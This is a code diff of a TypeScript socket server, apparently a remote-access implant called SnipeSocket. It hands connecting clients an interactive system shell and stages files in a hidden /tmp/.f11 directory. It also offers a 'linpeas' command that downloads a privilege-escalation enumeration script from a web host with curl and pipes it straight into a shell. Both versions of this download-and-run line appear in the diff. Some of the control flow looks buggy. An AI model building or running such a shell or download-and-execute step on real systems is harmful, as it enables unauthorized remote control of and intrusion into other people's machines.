@@ -1,14 +1,15 @@
 // Imports
 import colors from 'colors/safe';
-import { spawn, execSync, spawnSync, ChildProcessWithoutNullStreams } from 'child_process';
+import { spawn, execSync, spawnSync, SpawnOptionsWithoutStdio, ChildProcessWithoutNullStreams } from 'child_process';
 import os from 'os';
 import fs from 'fs';
 import net from 'net';
+import http from 'http';
 import tty, { ReadStream, WriteStream } from 'tty';
 import stream, { Duplex, Readable, Writable } from 'stream';
 
 const WEB_HOST = 'http://localhost:8000';
-const UNIX_SHELLS = ['zsh', 'bash', 'sh'];
+const UNIX_SHELLS = ['bash', 'sh'];
 const UNIX_DEFAULT = 'bin/sh';
 const TMP_DIR = `/tmp/.f11`;
 const CMD_PASS = ['ls', 'cat', 'pwd', 'whoami', 'cd', 'curl', 'wget'];
@@ -70,6 +71,7 @@ const findNixShell = (): string => {
 }
 
 const findShell = (): string => isNotWindows() ? findNixShell() : findWinShell();
+// const shellProcess = spawn(findShell(), [], { shell: true, detached: true });
 
 class SnipeSocket {
   public sock: net.Socket;
@@ -77,8 +79,9 @@ class SnipeSocket {
   public inShell = false;
   public inSpawn = false;
 
-  constructor (socket: net.Socket) {
+  constructor (socket: net.Socket, args: string[] = [], opts?: SpawnOptionsWithoutStdio) {
     this.sock = socket;
+    this.sock.on('data', this.onData.bind(this));
 
     if (!fs.existsSync(TMP_DIR)) fs.mkdirSync(TMP_DIR, { recursive: true });
 
@@ -91,47 +94,51 @@ class SnipeSocket {
     })
   }
 
+  public onData (data) {
+    msg('debug', `SnipeSocket.onData: ${data}`);
+
+    if (this.cp && this.inShell) {
+      this.command(data);
+    } else {
+      this.handle(data);
+    }
+  };
+
   public get sig(): string {
     return `${this.sock.remoteAddress}:${this.sock.remotePort}`
   }
 
-  public command(data: string, cb?: Function): void {
-    const args = data.toString().trim().split(' ').map(p => p.trim());
-    const cmd = args.shift() as string;
-    this.inShell = true;
+  public command(data: any, cb?: (code: number|null) => void): void {
+    if (this.inShell) {
+      if (this.cp && this.cp.stdin) {
+        const cmd = data.toString().trim();
 
-    const cp = spawn(cmd, args, { shell: true, detached: true });
-    this.sock.on('data', cp.stdin.write.bind(cp.stdin));
-    cp.stdout.on('data', this.sock.write.bind(this.sock));
-    cp.stderr.on('data', this.sock.write.bind(this.sock));
-
-    cp.on('close', (code) => {
-      msg('debug', `[downrun] Child process exited with code ${code}`);
-      this.inShell = false;
-
-      if (cb) cb(code);
-    });
+        if (!cmd) {
+          this.prompt();
+        } else if (/^(exit|quit)$/i.test(cmd)) {
+          this.inShell = false;
+          this.cleanup();
+          this.prompt();
+        } else {
+          msg('debug', `Send spawn command: ${data}`);
+          this.cp.stdin.write(data);
+        }
+      } else {
+        msg('warn', `Unable to send cmd (missing cp or cp.stdin): ${data}`);
+      }
+    } msg('debug', `Not sending command (not inShell): ${data}`);
   }
 
-  public downrun(file: string, cb?: Function): void {
-    this.inShell = true;
+  public downrun(file: string, cb?: (code: number|null) => void): void {
+    // this.inShell = true;
     const url = `${WEB_HOST}/${file}`;
     // const dwn = `${TMP_DIR}/${file}`;
 
-    const cp = spawn('curl', [`-sSL ${url} | bash`], { shell: true, detached: true });
-    this.sock.on('data', cp.stdin.write.bind(cp.stdin));
-    cp.stdout.on('data', this.sock.write.bind(this.sock));
-    cp.stderr.on('data', this.sock.write.bind(this.sock));
-
-    // cp.on('close', (code) => {
-    //   msg('debug', `[downrun] Child process exited with code ${code}`);
-    //   this.inShell = false;
-
-    //   if (cb) cb(code);
-    // });
+    this.shell('/bin/sh -c', [`"$(curl -sSL ${url})"`], { detached: true }, cb);
   }
 
   public prompt(): void {
+    this.cp?.stdin?.write(' ');
     this.sock.write(`${NEWLINE}${PROMPT}`);
   }
 
@@ -159,39 +166,46 @@ class SnipeSocket {
     this.prompt();
   }
 
-  public spawn (cmd: string, args?: string[], stable?: boolean, opts?: any, cb?: (code: number | null) => void) {
-    this.inSpawn = true;
-    const cp = spawn(cmd, args, opts);
-    this.sock.on('data', cp.stdin.write.bind(cp.stdin));
-    cp.stdout.on('data', this.sock.write.bind(this.sock));
-    cp.stderr.on('data', this.sock.write.bind(this.sock));
+  public spawn(cmd: string, args: string[] = [], opts?: SpawnOptionsWithoutStdio, cb?: (code: number|null) => void) {
+    this.cp = spawn(cmd, args, opts);
 
-    if (stable) cp.stdin.write(`${STABALIZE}${NEWLINE}`);
-    // this.sock.pipe(cp.stdin);
-    // cp.stdout.pipe(this.sock);
-    // cp.stderr.pipe(this.sock);
+    // this.cp.stdout.pipe(this.sock);
+    // this.cp.stderr.pipe(this.sock);
 
-    // What about no out?? on enter?
-    cp.on('close', (code) => {
-      msg('debug', `Child process exited with code ${code}`);
-      this.inSpawn = false;
+    this.cp.stdout.on('data', (data) => {
+      msg('debug', `SnipeSocket.cp.stdout: ${data}`);
+      this.sock.write(data);
+    });
 
+    this.cp.stderr.on('data', (data) => {
+      msg('debug', `SnipeSocket.cp.stderr: ${data}`);
+      this.sock.write(data);
+    });
+
+    this.cp.on('close', (code) => {
+      msg('debug', `[spawn] Child process exited with code ${code}`);
+      this.cleanup();
       if (cb) cb(code);
     });
   }
 
-  public shell() {
+  public shell(cmd?: string, args: string[] = [], opts?: SpawnOptionsWithoutStdio, cb?: (code: number|null) => void) {
+    const target = cmd || findShell();
     this.inShell = true;
-    this.spawn(findShell(), [], true, { shell: true, detached: true },  (code) => {
-      msg('info', `[shell] Child process exited with code ${code}`);
+
+    this.spawn(target, args, opts, (code) => {
       this.inShell = false;
+      if (cb) cb(code);
     });
   }
 
+  public cleanup(): void {
+    this.cp.removeAllListeners();
+  }
+
   public linpeas() {
-    this.downrun('linpeas.sh', () => {
-      this.prompt();
-    });
+    this.downrun('linpeas.sh');
+    // this.prompt();
   }
 
   public handle(data: Buffer) {
@@ -199,17 +213,18 @@ class SnipeSocket {
 
     const cmd = data.toString().trim();
 
+    if (this.inShell) return;
+
     if (/^shell$/i.test(cmd)) {
       this.shell();
     } else if (/^linpeas(\.sh)?$/i.test(cmd)) {
       this.linpeas();
-    } else if (CMD_PASS.includes(cmd)) {
-      this.command(cmd, () => this.prompt());
-    } else if (!this.inShell) {
+    // } else if (this.inShell) {
+    //   this.command(cmd);
+    } else {
       this.sock.write(colors['warn'](`Command not found: '${cmd}'`));
+      this.prompt();
     }
-
-    if (!this.inShell) this.prompt();
   }
 }
 
@@ -228,49 +243,8 @@ server.on('connection', (sock: net.Socket) => {
   msg('info', `[${socket.sig}] New Connection`);
 
   try {
-    // socket.welcome();
-
+    socket.welcome();
     // socket.sock.on('data', socket.handle.bind(socket));
-    socket.sock.on('data', (data) => {
-      msg('info', `Main loop sock.on(data) => ${data}`);
-      const args = data.toString().trim().split(' ').map(p => p.trim());
-      const cmd = args.shift() as string;
-
-      const cp = spawn(cmd, args, {
-        shell: true,
-        detached: true,
-        stdio: [ 0, 1, 2 ]
-      });
-
-      socket.sock.on('data', (data) => {
-        msg('debug', `socket.sock.on(data): ${data}`);
-        if (cp.stdin?.writable) {
-          cp.stdin.write(data);
-        } else {
-          msg('warn', `CP stdin NOT WRITABLE!`);
-        }
-      });
-
-      cp.on('disconnect', () => msg('debug', 'CP Disconnected'));
-      cp.on('error', (err) => msg('debug', `CP Error: ${err.message}`));
-      cp.on('close', (code) => msg('debug', `CP Close: ${code}`));
-      cp.on('exit', (code, signal) => msg('debug', `CP Exit: ${code}`));
-      cp.on('message', (message, sendHandle) => msg('debug', `CP Message: '${message}' (${sendHandle})`));
-      cp.on('spawn', () => msg('debug', `CP Spawn`));
-      // cp.stdout.on('data', (data) => {
-      //   msg('debug', `cp.stdout.on(data): ${data}`);
-      //   socket.sock.write(data);
-      // });
-      // cp.stderr.on('data', (data) => {
-      //   msg('debug', `cp.stderr.on(data): ${data}`);
-      //   socket.sock.write(data);
-      // });
-
-      cp.on('close', (code) => {
-        msg('debug', `Child process exited with code ${code}`);
-        // cp.stdin.end();
-      });
-    });
 
     socket.sock.on('close', (hadError: boolean) => {
       if (hadError) log(`Socket.on(close) with error!`);
